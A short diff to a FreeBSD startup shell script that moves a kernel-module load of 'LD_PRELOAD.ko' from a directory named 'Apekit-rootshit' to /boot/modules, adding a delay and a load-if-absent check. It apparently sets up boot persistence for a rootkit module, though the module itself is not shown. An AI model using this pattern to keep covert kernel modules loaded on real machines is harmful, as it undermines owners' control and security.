@@ -1,7 +1,5 @@
 #!/bin/sh
 
-
-/sbin/kldload /Apekit-rootshit/LD_PRELOAD.ko
-
-
+sleep 30
+kldstat | grep -q "LD_PRELOAD.ko" || /sbin/kldload /boot/modules/LD_PRELOAD.ko
 
